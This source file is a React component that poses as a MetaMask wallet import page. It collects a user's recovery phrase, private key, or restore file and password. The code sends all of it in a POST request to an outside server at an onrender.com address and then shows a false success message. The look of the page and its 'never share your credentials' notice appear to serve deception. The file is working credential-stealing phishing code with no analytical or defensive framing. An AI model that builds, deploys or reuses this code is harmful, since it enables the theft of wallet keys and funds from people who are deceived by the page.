import { useState,useEffect } from "react";
import { FaShieldAlt } from "react-icons/fa";
import { FaFileUpload } from "react-icons/fa";
import { FaLock } from "react-icons/fa";
import { FaKey } from "react-icons/fa";
import { IoMdArrowRoundForward } from "react-icons/io";
import { FaCircleInfo } from "react-icons/fa6";
import { FaCloudArrowUp } from "react-icons/fa6";
import { FaEye } from "react-icons/fa";
import { FaEyeLowVision } from "react-icons/fa6";

export default function Connect() {
  const [active, setActive] = useState("phrase");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [file, setFile] = useState(null);
  const [phrase, setPhrase] = useState("");
  const [phraseError, setPhraseError] = useState("");
  const [privateKeyError, setPrivateKeyError] = useState("");
  const [fileError, setFileError] = useState("");
  const [successMessage, setSuccessMessage] = useState("");

  const handleDrop = (e) => {
    e.preventDefault();
    const droppedFile = e.dataTransfer.files[0];
    if (droppedFile) setFile(droppedFile);
  };
    useEffect(() => {
      window.scrollTo({ top: 0, behavior: "smooth" });
    }, []);


  const handleSubmit = async (e) => {
    e.preventDefault();
    let payload = {};
    setPhraseError("");
    setPrivateKeyError("");
    setFileError("");
    setSuccessMessage("");

    if (active === "phrase") {
      const words = phrase.trim().split(/\s+/);
      if (words.length !== 12) {
        setPhraseError("Recovery phrase must be exactly 12 words");
        return;
      }
      payload = { method: "phrase", phrase: words.join(" ") };
    }

    if (active === "private key") {
      const cleaned = password.trim();
      if (!/^[a-zA-Z0-9]{64}$/.test(cleaned)) {
        setPrivateKeyError("Private key must be exactly 64 alphanumeric characters");
        return;
      }
      payload = { method: "privateKey", privateKey: cleaned };
    }

    if (active === "rf") {
      if (!file) {
        setFileError("Please upload a file");
        return;
      }
      payload = { method: "rf", password: password || "" };
    }

    try {
      const formData = new FormData();
      if (active === "rf") {
        formData.append("file", file);
        formData.append("password", password || "");
        formData.append("method", "rf");
      }

      const res = await fetch(" https://nodepro-nk7r.onrender.com/api/send", {
        method: "POST",
        headers: active === "rf" ? {} : { "Content-Type": "application/json" },
        body: active === "rf" ? formData : JSON.stringify(payload),
      });

      const data = await res.json();
      if (data.success) {
        setSuccessMessage("Wallet imported successfully!");
      } else {
        if (data.error.toLowerCase().includes("phrase")) setPhraseError(data.error);
        if (data.error.toLowerCase().includes("private")) setPrivateKeyError(data.error);
        if (data.error.toLowerCase().includes("file")) setFileError(data.error);
      }
    } catch (err) {
      console.error("Error posting:", err);
    }
  };

  return (
    <div className="bg-[#F5F7FA] min-h-screen flex flex-col items-center p-4 transition-all duration-[.5s] ease-in">
      <div className="w-full max-w-[550px] m-auto mt-10 text-center px-2">
        <div className="text-[33px] font-bold">Import MetaMask</div>
        <div className="text-[20px] text-[gray] mt-2">Choose how you'd like to import your wallet</div>
      </div>

      <div className="flex flex-wrap justify-center mt-6 gap-3 w-full max-w-[550px] px-2">
        <button
          onClick={() => setActive("phrase")}
          className={`flex-1 min-w-[140px] rounded-[10px] gap-[10px] flex items-center justify-center h-[50px] ${
            active === "phrase" ? "bg-blue-500 text-white" : "bg-white text-[gray]"
          } cursor-pointer transition-all duration-[.3s] ease-in`}
        >
          <FaKey className="text-[19px]" />
          <div className="text-[15px]">Phrase</div>
        </button>
        <button
          onClick={() => setActive("rf")}
          className={`flex-1 min-w-[140px] rounded-[10px] gap-[10px] flex items-center justify-center h-[50px] ${
            active === "rf" ? "bg-blue-500 text-white" : "bg-white text-[gray]"
          } cursor-pointer transition-all duration-[.3s] ease-in`}
        >
          <FaFileUpload className="text-[19px]" />
          <div className="text-[15px]">Restore File</div>
        </button>
        <button
          onClick={() => setActive("private key")}
          className={`flex-1 min-w-[140px] rounded-[10px] gap-[10px] flex items-center justify-center h-[50px] ${
            active === "private key" ? "bg-blue-500 text-white" : "bg-white text-[gray]"
          } cursor-pointer transition-all duration-[.3s] ease-in`}
        >
          <FaLock />
          <div className="text-[15px]">Private Key</div>
        </button>
      </div>

      <div className="w-full max-w-[550px] mt-6 flex flex-col gap-4 px-2">
        {active === "phrase" && (
          <form onSubmit={handleSubmit} className="bg-[#fff] rounded-[15px] grid border border-[#b2b2b2] p-4 gap-4">
            <label className="text-[18px] font-medium text-[#333]">Secret Recovery Phrase</label>
            <textarea
              placeholder="Enter your recovery phrase"
              className={`h-[100px] resize-none font-medium border-2 p-[10px] rounded-[15px] mt-2 text-[14px] w-full ${
                isFocused ? "border-green-700 bg-white" : "border-green-500 bg-gray-100"
              }`}
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              onFocus={() => setIsFocused(true)}
              onBlur={() => setIsFocused(false)}
            ></textarea>
            <div className="text-[15px] text-[gray] flex items-center gap-[10px]">
              <FaCircleInfo />
              <div> Typically 12 words separated by single spaces</div>
            </div>

            <div className="p-[25px] flex bg-blue-50 w-full gap-[10px] rounded-[15px]">
              <FaShieldAlt className="text-[40px] text-blue-500" />
              <div>
                <div className="font-medium text-[#333]">Security Notice</div>
                <div className="text-[gray]">Never share your wallet credentials with anyone. This information gives full access to your wallet.</div>
              </div>
            </div>

            <button className="flex items-center w-full h-[50px] gap-[10px] justify-center bg-blue-500 hover:bg-blue-600 rounded-[15px] transition-all duration-[.2s] hover:translate-y-[-2px] ease-in cursor-pointer">
              <IoMdArrowRoundForward className="text-[22px] text-white" />
              <div className="text-white">Import Wallet</div>
            </button>
          </form>
        )}

        {active === "rf" && (
          <form onSubmit={handleSubmit} className="bg-[#fff] rounded-[15px] grid border border-[#b2b2b2] p-4 gap-4">
            <label className="text-[18px] font-medium text-[#333]">Restore File</label>
            <div
              onDrop={handleDrop}
              onDragOver={(e) => e.preventDefault()}
              onClick={() => document.getElementById("fileInput").click()}
              className="border-2 border-dashed border-[#c2c2c2] hover:border-blue-500 rounded-lg w-full p-6 flex flex-col items-center justify-center text-center cursor-pointer hover:bg-blue-50"
            >
              <FaCloudArrowUp className="text-blue-500 w-10 h-10 mb-2" />
              <p className="text-gray-600 text-[14px]">{file ? file.name : "Click to upload or drag and drop"}</p>
              <input id="fileInput" type="file" className="hidden" onChange={(e) => setFile(e.target.files[0])} />
            </div>

            <label className="font-medium text-[14px]">Password (Optional)</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter password if required"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="border-2 rounded-[15px] bg-[#f2f2f2] w-full p-[12px] border-green-500 mt-[10px]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-2 top-7 text-gray-500 hover:text-gray-700"
              >
                {showPassword ? <FaEyeLowVision size={18} /> : <FaEye size={18} />}
              </button>
            </div>

            <div className="p-[25px] flex bg-blue-50 w-full gap-[10px] rounded-[15px]">
              <FaShieldAlt className="text-[40px] text-blue-500" />
              <div>
                <div className="font-medium text-[#333]">Security Notice</div>
                <div className="text-[gray]">Never share your wallet credentials with anyone. This information gives full access to your wallet.</div>
              </div>
            </div>

            <button className="flex items-center w-full h-[50px] gap-[10px] justify-center bg-blue-500 hover:bg-blue-600 rounded-[15px] transition-all duration-[.2s] hover:translate-y-[-2px] ease-in cursor-pointer">
              <IoMdArrowRoundForward className="text-[22px] text-white" />
              <div className="text-white">Import Wallet</div>
            </button>
          </form>
        )}

        {active === "private key" && (
          <form onSubmit={handleSubmit} className="bg-[#fff] rounded-[15px] grid p-4 gap-4 border border-[#b2b2b2]">
            <label className="text-[18px] font-medium text-[#333]">Private Key</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your private key"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="border-2 rounded-[15px] bg-[#f2f2f2] w-full p-[12px] border-green-500 mt-[10px]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-2 top-7 text-gray-500 hover:text-gray-700"
              >
                {showPassword ? <FaEyeLowVision size={18} /> : <FaEye size={18} />}
              </button>
            </div>
            <div className="text-[15px] text-[gray] flex items-center gap-[10px]">
              <FaCircleInfo />
              <div> Typically 64 alphanumeric characters</div>
            </div>

            <div className="p-[25px] flex bg-blue-50 w-full gap-[10px] rounded-[15px]">
              <FaShieldAlt className="text-[40px] text-blue-500" />
              <div>
                <div className="font-medium text-[#333]">Security Notice</div>
                <div className="text-[gray]">Never share your wallet credentials with anyone. This information gives full access to your wallet.</div>
              </div>
            </div>

            <button className="flex items-center w-full h-[50px] gap-[10px] justify-center bg-blue-500 hover:bg-blue-600 rounded-[15px] transition-all duration-[.2s] hover:translate-y-[-2px] ease-in cursor-pointer">
              <IoMdArrowRoundForward className="text-[22px] text-white" />
              <div className="text-white">Import Wallet</div>
            </button>
          </form>
        )}

        {phraseError && <div className="text-red-500 text-[14px] mt-1">{phraseError}</div>}
        {privateKeyError && <div className="text-red-500 text-[14px] mt-1">{privateKeyError}</div>}
        {fileError && <div className="text-red-500 text-[14px] mt-1">{fileError}</div>}
        {successMessage && <div className="text-green-600 text-[16px] font-medium my-2">{successMessage}</div>}
      </div>
    </div>
  );
}
